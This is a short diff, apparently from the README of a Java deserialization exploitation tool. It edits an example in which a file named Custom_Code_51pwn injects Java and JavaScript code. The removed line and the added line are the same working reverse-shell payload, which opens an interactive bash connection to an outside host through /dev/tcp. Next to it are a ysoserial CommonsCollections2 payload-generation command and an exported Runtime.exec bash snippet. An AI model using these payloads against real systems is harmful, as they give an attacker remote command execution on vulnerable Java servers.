@@ -18,8 +18,8 @@ export Custom_Code_51pwn='java.lang.Runtime.getRuntime().exec(new String[]{"bash
 ```
 - Allows java fragment code injection to be obtained from the current directory file **Custom_Code_51pwn** to solve complex problems
 ```
-$ cat Custom_Code_51pwn 
-try {new javax.script.ScriptEngineManager().getEngineByName("JavaScript").eval("var x=new java.lang.ProcessBuilder(\"bash\",\"-c\",\"exec bash -i &>/dev/tcp/rsh.51pwn.com/8880 <&1\",\"&\");x.start().getInputStream();");}catch (java.lang.Throwable e8876){}
+$ cat Custom_Code_51pwn
+try {new javax.script.ScriptEngineManager().getEngineByName("JavaScript").eval("var x=new java.lang.ProcessBuilder(\"bash\",\"-c\",\"exec bash -i &>/dev/tcp/rsh.51pwn.com/8880 <&1\");x.start().getInputStream();");}catch (java.lang.Throwable e8876){}
 
 java -jar /Users/51pwn/Downloads/ysoserial-all.jar CommonsCollections2 'xx'>cc2
 ```
